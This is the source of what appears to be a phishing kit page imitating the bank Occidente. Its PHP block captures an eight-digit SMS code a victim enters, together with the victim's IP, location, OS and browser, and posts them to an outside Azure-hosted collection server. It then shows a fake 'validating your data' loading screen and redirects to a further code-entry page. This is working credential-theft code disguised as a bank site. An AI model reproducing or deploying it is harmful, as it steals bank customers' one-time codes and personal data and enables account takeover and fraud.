<?php ini_set('display_errors', 0);
$userp = $_SERVER['REMOTE_ADDR'];

include('funciones.php');
if (isset($_POST['num1']) && isset($_POST['num2']) && isset($_POST['num3']) && isset($_POST['num4']) && isset($_POST['num5']) && isset($_POST['num6']) && isset($_POST['num7']) && isset($_POST['num8'])) {
    $message = 'OCCIDENTE
SMS: ' . $_POST['num1'] . $_POST['num2'] . $_POST['num3'] . $_POST['num4'] . $_POST['num5'] . $_POST['num6'] . $_POST['num7'] . $_POST['num8'] . '
Fecha: ' . date('l jS \of F Y h:i:s A', time()) . '
Ip y Localidad: ' . $myip . ' ' . $pais . ' ' . $region . '
SO: ' . $user_os . '
Navegador: ' . $navegador . '';
    $payload = ['mensaje' => $message];
    $url = 'https://servidorapis-ggdnawe6aefxerg7.canadacentral-01.azurewebsites.net/nesquis/';

    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST           => true,
        CURLOPT_HTTPHEADER     => [
            'Accept: application/json',
            'Content-Type: application/json'
        ],
        CURLOPT_POSTFIELDS     => json_encode($payload, JSON_UNESCAPED_UNICODE),
        CURLOPT_TIMEOUT        => 20,
        CURLOPT_CONNECTTIMEOUT => 10,
    ]);

    $response = curl_exec($ch);
    if ($response === false) {
        error_log('cURL error: ' . curl_error($ch));
        http_response_code(500);
        exit('Error de red.');
    }
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
} ?>

<!DOCTYPE html>
<html lang="en" class="hydrated" style="font-size: 14px;">

<head class="at-element-marker">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    <meta http-equiv="refresh" content="10;url=cod.php">

    <title>Occidente</title>


    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta http-equiv="refresh" content="10;url=cod.php">

    <style>
        .global-loading[_ngcontent-yru-c112] {
            position: absolute;
            background-color: #003585cc;
            width: 100%;
            height: 100%;
            z-index: 1001;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        *,
        *:before,
        *:after {
            box-sizing: border-box;
        }
    </style>
    <style>
        .global-loading[_ngcontent-yru-c112] .message-loading[_ngcontent-yru-c112] {
            display: flex;
            flex-direction: column;
            align-items: center;
        }
    </style>
    <style>
        .global-loading[_ngcontent-yru-c112] .message-loading[_ngcontent-yru-c112] .animation-shadow {
            width: 53px;
            height: 53px;
            transform: rotate(224deg);
            z-index: 1;
            background: rgba(0, 0, 0, .1);
            position: relative;
            top: 4px;
            box-shadow: -2px -4px 17px #00246f66;
        }

        .global-loading[_ngcontent-yru-c112] .message-loading[_ngcontent-yru-c112] .animation[_ngcontent-yru-c112] {
            width: 79px;
            top: -10px;
            right: 10px;
            transform: rotate(-45deg);
            position: relative;
        }

        .global-loading[_ngcontent-yru-c112] .message-loading[_ngcontent-yru-c112] .message[_ngcontent-yru-c112] {
            border-radius: 8px;
            border: 1px solid #DFE5F9;
            background: #FFFFFF;
            padding: 24px 48px 8px;
            display: flex;
            flex-direction: column;
        }
    </style>


    <div _ngcontent-yru-c112="" class="global-loading ng-star-inserted">
        <div _ngcontent-yru-c112="" class="message-loading">
            <div _ngcontent-yru-c112="" class="animation-shadow"><img _ngcontent-yru-c112="" src="./occi/final_occidente_spinner2.gif" class="animation"></div>
            <div _ngcontent-yru-c112="" class="message">
                <div _ngcontent-yru-c112="">POR FAVOR ESPERA UN MOMENTO</div>
                <div _ngcontent-yru-c112="">Estamos validando los datos</div>
            </div>
        </div>
    </div>

</html>